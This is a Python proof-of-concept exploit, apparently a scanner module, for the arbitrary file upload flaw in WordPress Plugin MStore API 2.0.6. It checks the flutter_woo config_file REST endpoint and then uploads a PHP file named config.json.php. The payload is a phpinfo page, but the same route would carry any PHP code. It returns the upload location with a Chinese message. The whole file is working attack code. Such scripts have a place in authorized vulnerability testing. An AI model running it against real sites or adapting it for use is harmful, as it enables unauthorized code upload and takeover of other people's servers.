# coding: utf-8
import requests
import random

def vuln_check(uri):
    response = requests.post(uri)
    raw = response.text
    print(raw)
    if "Key must be" in raw:
        return True
    else:
        return False


#Wordpress Plugin MStore API 2.0.6 - Arbitrary File Upload
def poc(url,user_agent,proxy):

    url = url.strip("/")
    rest_url = '/wp-json/api/flutter_woo/config_file'
    url = url + rest_url
    check = vuln_check(url)
    if not check:
        return

    file_path='data/phpinfo.php'
    header = {'User-Agent': user_agent}

    files = {'file' : ( "config.json.php",open(file_path), "application/json" )}

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = requests.post(url, headers=header,files=files, proxies=proxies)
    else:
        response = requests.post(url, headers=header,files=files)

    if response.status_code == 200 and response.text:
        return 'Wordpress Plugin MStore API 2.0.6 - 任意文件上传漏洞   上传的位置：'+response.text


def run(url,logindict,user_agent,proxies):
    result = poc(url,user_agent,proxies)
    return result

# run("http://192.168.220.128/Wordpress/wordpress-5.8.2-zh_CN/",{'admin':'admin'},'','127.0.0.1:8080')
